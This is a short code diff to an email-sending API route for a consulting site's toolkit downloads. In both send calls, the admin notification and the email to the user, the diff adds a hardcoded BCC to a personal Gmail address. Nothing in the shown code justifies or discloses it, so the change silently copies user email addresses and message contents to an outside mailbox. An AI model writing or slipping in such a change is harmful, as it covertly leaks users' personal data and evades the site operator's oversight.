@@ -33,7 +33,7 @@ export async function POST(request: Request) {
         const fromEmail = process.env.RESEND_FROM_EMAIL || 'Mama Hala Consulting <onboarding@resend.dev>';
 
         // 1. Notify admin
-        await resend.emails.send({
+        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
           from: fromEmail,
           to: process.env.RESEND_ADMIN_EMAIL || 'admin@mamahala.ca',
           subject: `Toolkit Download: ${toolkit?.en || toolkitId} — ${email}`,
@@ -48,7 +48,7 @@ export async function POST(request: Request) {
         });
 
         // 2. Send toolkit email to user
-        await resend.emails.send({
+        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
           from: fromEmail,
           to: email,
           subject: isAr
